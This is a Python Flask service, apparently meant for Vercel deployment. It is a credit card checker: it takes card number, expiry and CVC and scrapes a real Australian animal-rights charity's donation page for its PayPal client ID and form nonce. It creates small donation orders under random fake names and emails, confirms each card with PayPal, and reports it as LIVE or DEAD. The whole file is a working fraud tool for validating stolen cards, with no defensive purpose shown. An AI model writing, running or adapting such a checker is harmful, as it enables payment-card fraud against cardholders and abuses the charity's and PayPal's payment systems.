import requests
import re
import random
import string
import base64
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{get_random_string(10)}@{random.choice(domains)}"

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "ERROR", "msg": "Use /check?cc=n|m|y|c"}), 400

    try:
        n, mm, yy, cvc = cc_param.split('|')
        mm = mm.zfill(2)
        yy_full = f"20{yy[-2:]}"
    except Exception:
        return jsonify({"status": "ERROR", "msg": "Parse Error"}), 400

    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    try:
        # 1. Scrape Site Logic
        init_res = session.get('https://animalrights.org.au/donate-now/')
        form_url = re.search(r"data-form-view-url='([^']+)'", init_res.text).group(1).replace('&#038;', '&')
        
        form_html = session.get(form_url).text
        exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_html).group(1)
        data = json.loads(exported)
        
        settings = next(g for g in data['registeredGateways'] if g['id'] == 'paypal-commerce')['settings']
        client_id = settings['sdkOptions']['clientId']
        
        # 2. PayPal Token
        auth_header = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token', 
                                headers={'Authorization': f'Basic {auth_header}'},
                                data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. Create Order
        f_name, l_name = get_random_string(6).capitalize(), get_random_string(8).capitalize()
        email = generate_random_email()
        
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': str(settings['donationFormId']),
            'give-form-hash': settings['donationFormNonce'],
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': f_name,
            'give_last': l_name,
            'give_email': email,
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 4. Check Card
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={"payment_source": {"card": {"number": n, "security_code": cvc, "expiry": f"{yy_full}-{mm}"}}}
        ).json()

        if confirm_res.get('status') == 'APPROVED':
            return jsonify({"status": "LIVE", "card": cc_param, "msg": "Approved"})
        else:
            msg = confirm_res.get('message', 'DECLINED')
            if 'details' in confirm_res: msg = confirm_res['details'][0].get('issue', 'DECLINED')
            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg})

    except Exception as e:
        return jsonify({"status": "ERROR", "msg": str(e)}), 500

# Required for Vercel
app = app
